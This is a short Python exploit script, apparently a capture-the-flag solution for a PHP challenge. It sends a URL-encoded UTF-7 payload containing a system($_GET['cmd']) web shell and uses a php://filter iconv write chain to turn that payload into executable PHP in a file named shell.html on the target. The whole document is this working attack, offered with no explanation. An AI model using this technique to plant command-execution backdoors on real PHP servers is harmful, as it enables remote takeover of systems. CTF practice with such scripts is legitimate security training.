import urllib
from requests import get

output = "php://filter/write=convert.iconv.utf7.utf8/resource=shell.html"
# payload = "+ADw?+AD0 +AGAAJAB7AF8-GET+AFsAIg-cmd+ACIAXQB9AGA ?+AD4-"
payload = "%2BADw%3F%2BAD0-system%28%2BACQAXw-GET%2BAFsAIg-cmd%2BACIAXQ%29%3F%2BAD4-"

res = get("https://babyphp.h4ck3r.quest/?code="+payload+"&output="+output)

print(res.text)